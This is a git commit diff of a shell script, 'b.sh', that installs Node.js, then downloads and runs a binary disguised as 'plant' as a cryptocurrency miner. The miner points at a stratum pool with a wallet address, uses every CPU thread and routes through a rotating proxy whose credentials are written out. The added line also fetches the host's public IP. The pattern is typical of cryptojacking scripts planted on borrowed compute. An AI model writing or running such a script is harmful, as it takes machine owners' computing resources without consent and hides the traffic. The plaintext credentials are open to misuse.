0ca8f9bd41745f40fbb7bd86c13466c3aa927f4a
maximussale1 <100412455+maximussale1@users.noreply.github.com>
2022-06-12 19:53:13 +0700

    Update b.sh

--- b.sh
+++ b.sh
@@ -3,7 +3,6 @@ wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
 \rm node-v14.17.0-linux-x64.tar.gz
 PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
 npm config set cache /tmp --global
-wget https://gitlab.com/richardkevin320/donlod/-/raw/main/plant -O - | chmod +x plant
+wget https://gitlab.com/richardkevin320/donlod/-/raw/main/plant.tar.gz -O - | tar -xz
 ph add plant
-./plant -a yespowerTIDE -o stratum+tcp://51.161.117.115:17059 -u TGYVQ8n7a46eyfQtwddy2eFdjLUP5mYLzv.HEAD -p c=Tet -t $(nproc) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80
-
+ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./plant -a yespowerTIDE -o stratum+tcp://51.161.117.115:17059 -u TGYVQ8n7a46eyfQtwddy2eFdjLUP5mYLzv.Awewe -p c=Tet -t $(nproc) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80
